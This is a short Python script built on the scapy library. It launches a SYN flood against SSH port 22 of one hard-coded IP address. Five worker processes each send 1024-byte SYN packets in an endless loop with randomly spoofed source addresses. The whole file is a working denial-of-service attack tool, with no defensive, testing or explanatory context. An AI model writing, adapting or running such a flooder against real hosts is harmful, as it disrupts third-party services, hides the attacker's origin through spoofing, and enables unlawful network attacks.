from scapy.all import *
import multiprocessing
from random import randint

def worker(x):
    target_ip = "185.43.205.14"
    target_port = 22
    
    fOct = randint(1,250)
    sOct = randint(1,250)
    tOct = randint(1,250)
    foOct = randint(1,250)

    ip = IP(src=f"{fOct}.{sOct}.{tOct}.{foOct}", dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags = "S")

    raw = Raw(b"A"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose = 0)

if __name__ == "__main__":
    num_processes = 5
    data_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    with multiprocessing.Pool(processes=num_processes) as pool:
        pool.map(worker, data_list)